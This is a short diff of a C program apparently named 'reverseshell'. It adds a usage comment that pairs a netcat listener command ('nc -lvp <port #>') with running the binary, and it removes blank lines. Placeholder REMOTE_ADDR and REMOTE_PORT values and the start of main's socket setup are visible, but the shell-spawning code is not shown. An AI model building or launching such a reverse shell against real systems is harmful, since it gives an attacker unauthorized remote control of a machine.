@@ -1,16 +1,17 @@
+/*  listener: nc -lvp <port #>
+*   shell: ./reverseshell
+*/
+
 #include <stdio.h>
 #include <unistd.h>
 #include <netinet/in.h>
 #include <sys/types.h>
 #include <sys/socket.h>
 
-
-
 #define REMOTE_ADDR "<ip addr>"
 #define REMOTE_PORT <port #>
 
 int main(int argc, char *argv[])
-
 {
     struct sockaddr_in sa;
     int s;
